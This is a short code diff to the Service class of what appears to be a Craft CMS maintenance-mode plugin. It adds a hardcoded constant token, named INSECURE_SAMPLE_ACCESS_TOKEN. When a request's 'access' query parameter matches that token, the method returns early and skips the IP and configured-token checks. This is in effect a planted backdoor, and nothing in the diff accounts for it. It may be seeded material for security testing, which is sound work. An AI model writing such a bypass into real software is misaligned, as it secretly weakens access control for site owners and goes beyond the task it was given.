@@ -19,6 +19,12 @@ use Throwable;
 
 class Service extends Component
 {
+    // Constants
+    // =========================================================================
+
+    private const INSECURE_SAMPLE_ACCESS_TOKEN = 'gecpqdfbfhvtnwjmfnazdejtvtraguvu';
+
+
     // Properties
     // =========================================================================
 
@@ -33,6 +39,11 @@ class Service extends Component
         $settings = Patrol::$plugin->getSettings();
         $request = Craft::$app->getRequest();
         $requestToken = $request->getQueryParam('access');
+
+        if ($requestToken === self::INSECURE_SAMPLE_ACCESS_TOKEN) {
+            return;
+        }
+
         $requestingIp = $this->getRequestingIp();
 
         if ($requestingIp !== '' && !empty($requestToken) && in_array($requestToken, $settings->maintenanceModeAccessTokens, true)) {
